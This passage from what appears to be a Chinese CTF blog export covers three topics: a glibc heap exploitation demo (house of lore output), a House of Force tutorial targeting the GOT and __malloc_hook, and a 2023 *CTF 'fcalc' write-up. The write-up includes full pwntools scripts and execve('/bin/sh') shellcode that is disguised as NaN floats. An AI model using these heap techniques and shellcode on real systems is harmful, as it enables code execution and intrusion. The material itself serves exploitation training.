class="string">&quot;Now allocating a chunk with size equal to the first one freed\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n&quot;</span>);</span><br><span class="line">  <span class="type">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = malloc(0x100)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n&quot;</span>,</span><br><span class="line">         stack_buffer_2[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\np4 is %p and should be on the stack!\n&quot;</span>, p4); <span class="comment">// this chunk will be allocated on stack</span></span><br><span class="line">  <span class="type">intptr_t</span> sc = (<span class="type">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line"></span><br><span class="line">  <span class="type">long</span> offset = (<span class="type">long</span>)__builtin_frame_address(<span class="number">0</span>) - (<span class="type">long</span>)p4;</span><br><span class="line">  <span class="built_in">memcpy</span>((p4+offset+<span class="number">8</span>), &amp;sc, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// sanity check</span></span><br><span class="line">  assert((<span class="type">long</span>)__builtin_return_address(<span class="number">0</span>) == (<span class="type">long</span>)jackpot);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>char *p4 &#x3D; malloc(0x100);由于在void *p3 &#x3D; malloc(0x100);会把smallbin里的前七个chunk从头拿到tcache里，所以到达tcache的顺序和在smallbin里的顺序是相反的</p><p>所以p4 申请到的是&amp;fake_freelist[4]的位置</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Allocating the victim chunk</span><br><span class="line">Allocated the first small chunk on the heap at <span class="number">0x55641a70e2a0</span></span><br><span class="line">Allocating dummy chunks <span class="keyword">for</span> using up tcache later</span><br><span class="line">stack_buffer_1 at <span class="number">0x7ffed8b0f770</span></span><br><span class="line">stack_buffer_2 at <span class="number">0x7ffed8b0f790</span></span><br><span class="line">Create a fake <span class="built_in">free</span>-<span class="built_in">list</span> on the <span class="built_in">stack</span></span><br><span class="line">fake <span class="built_in">free</span>-<span class="built_in">list</span> at <span class="number">0x7ffed8b0f7f0</span></span><br><span class="line">Create a fake chunk on the <span class="built_in">stack</span></span><br><span class="line">Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corruptedin second to the last <span class="built_in">malloc</span>, which putting <span class="built_in">stack</span> address on smallbin <span class="built_in">list</span></span><br><span class="line">Set the bk pointer to stack_buffer_2 and <span class="built_in">set</span> the fwd pointer of stack_buffer_2 to point to stack_buffer_1 in order to bypass the check of small bin corrupted in last <span class="built_in">malloc</span>, which returning pointer to the fake chunk on stackSet the bck pointer of stack_buffer_2 to the fake <span class="built_in">free</span>-<span class="built_in">list</span> in order to prevent crash prevent crash introduced by smallbin-to-tcache mechanism</span><br><span class="line">Allocating another large chunk in order to avoid consolidating the top chunk withthe small one during the <span class="title function_">free</span><span class="params">()</span></span><br><span class="line">Allocated the large chunk on the heap at 0x55641a70eb20</span><br><span class="line">Freeing dummy chunk</span><br><span class="line">Freeing the chunk 0x55641a70e2a0, it will be inserted in the unsorted bin</span><br><span class="line"></span><br><span class="line">In the unsorted bin the victim&#x27;s fwd and bk pointers are the unsorted bin&#x27;s header <span class="title function_">address</span> <span class="params">(libc addresses)</span></span><br><span class="line">victim-&gt;fwd: 0x7fcfdf28ebe0</span><br><span class="line">victim-&gt;bk: 0x7fcfdf28ebe0</span><br><span class="line"></span><br><span class="line">Now performing a <span class="built_in">malloc</span> that can&#x27;t be handled by the UnsortedBin, nor the small bin</span><br><span class="line">This means that the chunk 0x55641a70e2a0 will be inserted in front of the SmallBin</span><br><span class="line">The chunk that can&#x27;t be handled by the unsorted bin, nor the SmallBin has been allocated to 0x55641a70ef10</span><br><span class="line">The victim chunk has been sorted and its fwd and bk pointers updated</span><br><span class="line">victim-&gt;fwd: 0x7fcfdf28ece0</span><br><span class="line">victim-&gt;bk: 0x7fcfdf28ece0</span><br><span class="line"></span><br><span class="line">Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer</span><br><span class="line">Now take all dummies chunk in tcache out</span><br><span class="line">Now allocating a chunk with size equal to the first one freed</span><br><span class="line">This should <span class="keyword">return</span> the overwritten victim chunk and <span class="built_in">set</span> the bin-&gt;bk to the injected victim-&gt;bk pointer</span><br><span class="line">This last <span class="built_in">malloc</span> should trick the glibc <span class="built_in">malloc</span> to <span class="keyword">return</span> a chunk at the position injected in bin-&gt;bk</span><br><span class="line">p4 = <span class="built_in">malloc</span>(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">The fwd pointer of stack_buffer_2 has changed after the last <span class="built_in">malloc</span> to <span class="number">0x7ffed8b0f780</span></span><br><span class="line"></span><br><span class="line">p4 is <span class="number">0x7ffed8b0f880</span> and should be on the <span class="built_in">stack</span>!</span><br><span class="line">Nice jump d00d</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>House of Force</title>
      <link href="/2023/08/02/house-of-force/"/>
      <url>/2023/08/02/house-of-force/</url>
      
        <content type="html"><![CDATA[<p>似乎只能在2.23和2.27上成功</p><p>利用方法就是控制topchunksize为一个很大的值，一般为-1，申请一个堆使topchunk指向目标地址，下一次就可以申请出来目标地址</p><p>下面都按照64位来分析，其余bin里没有chunk是会从topchunk切割</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))</span></span><br><span class="line">victim = av-&gt;top;<span class="comment">//获取当前top chunk的地址</span></span><br><span class="line">size   = chunksize(victim);<span class="comment">//top chunk的大小</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))<span class="comment">//nb是申请的大小+chunkhead 0x10，MINSIZE就是堆块的最小size，32位程序为0x10，64位程序为0x20</span></span><br><span class="line">&#123;                                                             <span class="comment">//主要是为了topchunk切割后剩余可以够完整一个堆块</span></span><br><span class="line">    remainder_size = size - nb;<span class="comment">//切割后的topchunk大小</span></span><br><span class="line">    remainder      = chunk_at_offset(victim, nb);<span class="comment">//</span></span><br><span class="line">    av-&gt;top        = remainder;<span class="comment">//更新top chunk指针，下次申请的位置</span></span><br><span class="line">    set_head(victim, nb | PREV_INUSE |</span><br><span class="line">            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head(remainder, remainder_size | PREV_INUSE);<span class="comment">//切割后的top chunk设置新的size，这句会改写目标地址上面的值</span></span><br><span class="line"></span><br><span class="line">    check_malloced_chunk(av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以我们要计算第一次malloc的大小malloc_size从而使topchunk指向目标地址target-0x10，因为会有个chunkhead嘛</p><p>target-0x10&#x3D;remainder&#x3D;chunk_at_offset(victim, nb)&#x3D;victim+nb&#x3D;victim+mallocsize+0x10</p><p><strong>所以mallocsize&#x3D;target-0x20-victim</strong></p><p>void *__libc_malloc(size_t bytes) mallocsize会变为无符号，会经过下面的checked_request2size函数处理返回真正申请的size</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> checked_request2size(req, sz) \req是我们malloc参数的size，sz是经过处理后的size</span></span><br><span class="line">(&#123;                    \</span><br><span class="line">  (sz) = request2size (req);        \</span><br><span class="line">  <span class="keyword">if</span> (((sz) &lt; (req))            \</span><br><span class="line">      || REQUEST_OUT_OF_RANGE (sz)) \</span><br><span class="line">    &#123;                    \</span><br><span class="line">      __set_errno (ENOMEM);        \</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;                \</span><br><span class="line">    &#125;                    \</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MINSIZE  \</span></span><br><span class="line"><span class="meta">  (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INTERNAL_SIZE_T size_t</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE_SZ                (sizeof(INTERNAL_SIZE_T))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MALLOC_ALIGNMENT       (2 *SIZE_SZ)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MALLOC_ALIGN_MASK      (MALLOC_ALIGNMENT - 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                 \</span></span><br><span class="line"><span class="meta">  ((unsigned long) (req) &gt;=                              \</span></span><br><span class="line"><span class="meta">   (unsigned long) (INTERNAL_SIZE_T) (-2 * MINSIZE))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> request2size(req)                                             \</span></span><br><span class="line"><span class="meta">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span></span><br><span class="line"><span class="meta">   MINSIZE :                                                      \</span></span><br><span class="line"><span class="meta">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br></pre></td></tr></table></figure><p>REQUEST_OUT_OF_RANGE要求malloc大小不得大于-2 * MINSIZE，一般满足</p><p>request2size要求((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)&gt;&#x3D;req,基本上都满足，但是会影响我们的申请大小，这就需要req+SIZE_SZ最后四个bit为0，也就是req后面尽量为0x8才会不改变大小</p><h2 id="Wiki例子"><a href="#Wiki例子" class="headerlink" title="Wiki例子"></a>Wiki例子</h2><h3 id="指针减小来修改topchunk上面的内容"><a href="#指针减小来修改topchunk上面的内容" class="headerlink" title="指针减小来修改topchunk上面的内容"></a>指针减小来修改topchunk上面的内容</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> *ptr,*ptr2;</span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    ptr=(<span class="type">long</span> *)(((<span class="type">long</span>)ptr)+<span class="number">24</span>);</span><br><span class="line">    *ptr=<span class="number">-1</span>;        <span class="comment">// &lt;=== 这里把top chunk的size域改为0xffffffffffffffff</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">-4120</span>);  <span class="comment">// &lt;=== 减小top chunk指针</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);   <span class="comment">// &lt;=== 分配块实现任意地址写</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x602020</span></span><br><span class="line">Size: <span class="number">0x20fe1</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; got</span><br><span class="line"></span><br><span class="line">/mnt/hgfs/share/how2heap/glibc_2<span class="number">.23</span>/a.out:     file format elf64-x86<span class="number">-64</span></span><br><span class="line"></span><br><span class="line">DYNAMIC RELOCATION RECORDS</span><br><span class="line">OFFSET           TYPE              VALUE </span><br><span class="line"><span class="number">0000000000600f</span>f8 R_X86_64_GLOB_DAT  __gmon_start__</span><br><span class="line"><span class="number">0000000000601018</span> R_X86_64_JUMP_SLOT  __libc_start_main@GLIBC_2<span class="number">.2</span><span class="number">.5</span></span><br><span class="line"><span class="number">0000000000601020</span> R_X86_64_JUMP_SLOT  <span class="built_in">malloc</span>@GLIBC_2<span class="number">.2</span><span class="number">.5</span></span><br></pre></td></tr></table></figure><p>这里着重说下-4120，原本要申请的size为mallocsize&#x3D;target-0x20-victim&#x3D;0x00000000601020-0x20-0x602020&#x3D;FFFFFFFFFFFFEFE0&#x3D;-4128</p><p>但是不满足req后面尽量为0x8的条件，所以加了8变为FFFFFFFFFFFFEFE8&#x3D;-4120</p><p> malloc(-4120);后下一次就可以申请got</p><p><img src="/2023/08/02/house-of-force/image-20230803143306102.png" alt="image-20230803143306102"></p><p>got上面的值会被改写为大小</p><p><img src="/2023/08/02/house-of-force/image-20230803143531195.png" alt="image-20230803143531195"></p><h3 id="指针增大来修改topchunk下面的内容"><a href="#指针增大来修改topchunk下面的内容" class="headerlink" title="指针增大来修改topchunk下面的内容"></a>指针增大来修改topchunk下面的内容</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> *ptr,*ptr2;</span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    ptr=(<span class="type">long</span> *)(((<span class="type">long</span>)ptr)+<span class="number">24</span>);</span><br><span class="line">    *ptr=<span class="number">-1</span>;                 <span class="comment">//&lt;=== 修改top chunk size</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">140737345551056</span>); <span class="comment">//&lt;=== 增大top chunk指针</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x602020</span></span><br><span class="line">Size: <span class="number">0x20fe1</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; p &amp;__malloc_hook</span><br><span class="line">$<span class="number">1</span> = (<span class="type">void</span> *(**)(<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *)) <span class="number">0x7ffff7dd1b10</span> &lt;__malloc_hook&gt;</span><br></pre></td></tr></table></figure><p>140737345551056是从mallocsize&#x3D;target-0x20-victim&#x3D;0x7ffff7dd1b10-0x20-0x602020</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2023 *ctf pwn</title>
      <link href="/2023/08/02/startctf/"/>
      <url>/2023/08/02/startctf/</url>
      
        <content type="html"><![CDATA[<p>师傅们tql，题解出的太快了，orz</p><p><a href="https://github.com/sixstars/starctf2023/tree/main">https://github.com/sixstars/starctf2023/tree/main</a></p><h2 id="fcalc"><a href="#fcalc" class="headerlink" title="fcalc"></a>fcalc</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubantu20 ~/s/m/s/fcalc&gt; checksec ./fcalc</span><br><span class="line">[*] &#x27;/mnt/hgfs/share/match/startctf/fcalc/fcalc&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>这里有个溢出</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *buf; <span class="comment">// [rsp+30h] [rbp-28h]</span></span><br><span class="line">v7 = read(<span class="number">0</span>, buf, <span class="number">0x180</span>uLL);</span><br></pre></td></tr></table></figure><p>然后就是在运算符号为0时会溢出原来定义的函数数组会跳转到0040E0处的数据执行</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> _BYTE v6[<span class="number">12</span>]; <span class="comment">// [rsp+8h] [rbp-50h] BYREF </span></span><br><span class="line">s = v6;  </span><br><span class="line">qword_40E0 = s;</span><br></pre></td></tr></table></figure><p>40E0处存的一个栈地址，栈上是有可执行权限的，可以通过溢出往栈上写shellcode，shellcode按双精度浮点数解释需要满足下面的条件</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v13 = <span class="built_in">fabs</span>(*v10);</span><br><span class="line"><span class="keyword">if</span> ( v13 != <span class="number">0.0</span> &amp;&amp; (v13 &lt; <span class="number">1.0</span> || v13 &gt; <span class="number">100.0</span>) )</span><br></pre></td></tr></table></figure><p><img src="/2023/08/02/startctf/image-20230802164253679.png" alt="image-20230802164253679"></p><p>浮点数里有exp阶码全为1，有效数<strong>不全为0</strong>，表示Nan(not a number)</p><p>对于nan的一些特性 <strong>x：including NaN and ±∞</strong></p><table><thead><tr><th>Comparison</th><th>NaN ≥ <em>x</em></th><th>NaN ≤ <em>x</em></th><th>NaN &gt; <em>x</em></th><th>NaN &lt; <em>x</em></th><th>NaN &#x3D; <em>x</em></th><th>NaN ≠ <em>x</em></th></tr></thead><tbody><tr><td>Result</td><td>False</td><td>False</td><td>False</td><td>False</td><td>False</td><td>True</td></tr></tbody></table><p>所以只要浮点数的高位为0x7ff或0xfff即可</p><p>浮点数的低位再利用跳转指令跳转到shellcode即可，大概找到下面可以用的跳转指令</p><p><img src="/2023/08/02/startctf/image-20230802163426648.png" alt="image-20230802163426648"></p><p><img src="/2023/08/02/startctf/image-20230802155245832.png" alt="image-20230802155245832"></p><p><img src="/2023/08/02/startctf/image-20230802165152552.png" alt="image-20230802165152552"></p><p>计算偏移 </p><p><img src="/2023/08/02/startctf/image-20230802170108947.png" alt="image-20230802170108947"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p/x 0x7ffe32ff2d38-(0x7ffe32ff2d80+2)</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1 = 0xffffffffffffffb6</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p/x 0x7ffe32ff2d38-(0x7ffe32ff2d80+5)</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">2 = 0xffffffffffffffb3</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./fcalc&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line">db(<span class="string">&#x27;b *$rebase(0x1867)&#x27;</span>)</span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x0174E)&#x27;)</span></span><br><span class="line">NaNHeader = <span class="string">b&quot;\xFF\xfF&quot;</span></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"><span class="comment">#first</span></span><br><span class="line"><span class="comment">#FFFFFFB3</span></span><br><span class="line">call=<span class="string">b&#x27;\xE8\xb3\xFF\xFF\xFF&#x27;</span>+<span class="string">b&#x27;6&#x27;</span>+NaNHeader</span><br><span class="line"><span class="comment">#second</span></span><br><span class="line">jmp=<span class="string">b&#x27;\xE9\xb3\xFF\xFF\xFF&#x27;</span>+<span class="string">b&#x27;6&#x27;</span>+NaNHeader</span><br><span class="line"><span class="comment">#third</span></span><br><span class="line"><span class="comment"># B6</span></span><br><span class="line"><span class="comment"># jmp=b&#x27;\xEb\xb6&#x27;+b&#x27;beef&#x27;+NaNHeader</span></span><br><span class="line">sa(<span class="string">&#x27;expression:&#x27;</span>,<span class="string">b&#x27;1 2 0 hh&#x27;</span>+shellcode.ljust(<span class="number">0x48</span>,<span class="string">b&#x27;\x00&#x27;</span>)+call)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p>根据浮点数的解释规则来看，在有效数都为0时，阶码最小3FF(1023),有效数都为1，最大也就无限接近2，所以阶码最大为1023+log<sub>2</sub>(100&#x2F;2)&#x3D;1,028.643 即404h多</p><p>REX前缀的值介于40h到4Fh之间,<strong>一条指令只能有一个REX前缀，必须紧接在指令的第一个操作码字节之前。 REX前缀在其他任何位置都将被忽略。</strong></p><p>40的前缀是可以使用的,<strong>当我们用<code>\x40</code>覆盖某些指令时可以转义或被忽略（相当于nop）</strong></p><p>这边至少要开头两个0x40才能构成0x404的开头绕过检查，所以单句的payload不能大于6个字节</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    xor rsi, rsi</span></span><br><span class="line"><span class="string">    mul rsi #把rax置零</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov edi, 0x68732f</span></span><br><span class="line"><span class="string">    shl rdi,0x10</span></span><br><span class="line"><span class="string">    add di,0x6e69</span></span><br><span class="line"><span class="string">    shl rdi,0x10</span></span><br><span class="line"><span class="string">    add di,0x622f</span></span><br><span class="line"><span class="string">    push rdi</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    mov al, 59</span></span><br><span class="line"><span class="string">                </span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_sc</span>(<span class="params">ft</span>):</span><br><span class="line">    pd = flat(</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="number">0</span>:asm(ft)</span><br><span class="line">        &#125;,filler = <span class="string">&#x27;\x40&#x27;</span>,length=<span class="number">8</span></span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> pd</span><br><span class="line">payload=set_sc(<span class="string">&#x27;xor rsi, rsi&#x27;</span>)+set_sc(<span class="string">&#x27;mul rsi&#x27;</span>)+set_sc(<span class="string">&#x27;mov edi, 0x68732f&#x27;</span>)+set_sc(<span class="string">&#x27;shl rdi,0x10&#x27;</span>)+set_sc(<span class="string">&#x27;add di,0x6e69&#x27;</span>)+set_sc(<span class="string">&#x27;shl rdi,0x10&#x27;</span>)+set_sc(<span class="string">&#x27;add di,0x622f&#x27;</span>)+set_sc(<span class="string">&#x27;push rdi&#x27;</span>)+set_sc(<span class="string">&#x27;mov rdi, rsp&#x27;</span>)+set_sc(<span class="string">&#x27;mov al, 59&#x27;</span>)+set_sc(<span class="string">&#x27;push rax&#x27;</span>)+set_sc(<span class="string">&#x27;syscall&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sa(<span class="string">&#x27;expression:&#x27;</span>,<span class="string">b&#x27;1 2 0 hh&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>+payload)</span><br></pre></td></tr></table></figure><h3 id="方法3"><a href="#方法3" class="headerlink" title="方法3"></a>方法3</h3><p>官方paylaod是构造了jmp 4来跳到下一条指令</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; disasm(b<span class="string">&quot;\xEB\x02&quot;</span>)</span><br><span class="line"><span class="string">&#x27;   0:   eb 02                   jmp    0x4&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">jmpn = <span class="string">b&quot;\xEB\x02&quot;</span></span><br><span class="line">NaNHeader = <span class="string">b&quot;\xFF\x7F&quot;</span></span><br><span class="line"><span class="comment"># 0:  31 c0                   xor    eax,eax</span></span><br><span class="line"><span class="comment"># 2:  31 db                   xor    ebx,ebx</span></span><br><span class="line"><span class="comment"># 4:  66 b8 3b 00             mov    ax,0x3b</span></span><br><span class="line"><span class="comment"># 8:  66 bb 68 00             mov    bx,0x68</span></span><br><span class="line"><span class="comment"># c:  48 c1 e3 10             shl    rbx,0x10</span></span><br><span class="line"><span class="comment"># 10: 66 bb 2f 73             mov    bx,0x732f</span></span><br><span class="line"><span class="comment"># 14: 48 c1 e3 10             shl    rbx,0x10</span></span><br><span class="line"><span class="comment"># 18: 66 bb 69 6e             mov    bx,0x6e69</span></span><br><span class="line"><span class="comment"># 1c: 48 c1 e3 10             shl    rbx,0x10</span></span><br><span class="line"><span class="comment"># 20: 66 bb 2f 62             mov    bx,0x622f</span></span><br><span class="line"><span class="comment"># 24: 53                      push   rbx</span></span><br><span class="line"><span class="comment"># 25: 48 89 e7                mov    rdi,rsp</span></span><br><span class="line"><span class="comment"># 28: 31 f6                   xor    esi,esi</span></span><br><span class="line"><span class="comment"># 2a: 31 d2                   xor    edx,edx</span></span><br><span class="line"><span class="comment"># 2c: 0f 05                   syscall</span></span><br><span class="line">payload += <span class="string">b&#x27;\x31\xc0\x31\xdb&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">payload += <span class="string">b&#x27;\x66\xb8\x3b\x00&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">payload += <span class="string">b&#x27;\x66\xbb\x68\x00&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">payload += <span class="string">b&#x27;\x48\xc1\xe3\x10&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">payload += <span class="string">b&#x27;\x66\xbb\x2f\x73&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">payload += <span class="string">b&#x27;\x48\xc1\xe3\x10&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">payload += <span class="string">b&#x27;\x66\xbb\x69\x6e&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">payload += <span class="string">b&#x27;\x48\xc1\xe3\x10&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">payload += <span class="string">b&#x27;\x66\xbb\x2f\x62&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">payload += <span class="string">b&#x27;\x53\x48\x89\xe7&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">payload += <span class="string">b&#x27;\x31\xf6\x31\xd2&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">payload += <span class="string">b&#x27;\x0f\x05\x90\x90&#x27;</span> + jmpn + NaNHeader    <span class="comment"># \x90 is nop</span></span><br></pre></td></tr></table></figure><p>小于四字节的可以用nop来填充</p><h2 id="starvm"><a href="#starvm" class="headerlink" title="starvm"></a>starvm</h2><p>第一次接触vm 